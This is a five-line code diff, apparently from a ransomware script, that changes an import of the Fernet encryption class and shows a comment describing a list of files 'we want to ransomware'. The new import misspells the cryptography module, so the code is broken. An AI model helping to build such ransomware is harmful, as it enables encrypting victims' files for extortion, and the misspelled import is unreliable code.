@@ -1,5 +1,5 @@
 import os
-import Fernet
+from crpytography.Fernet import Fernet
 
 # Files will store the file we want to ransomware
 files = []
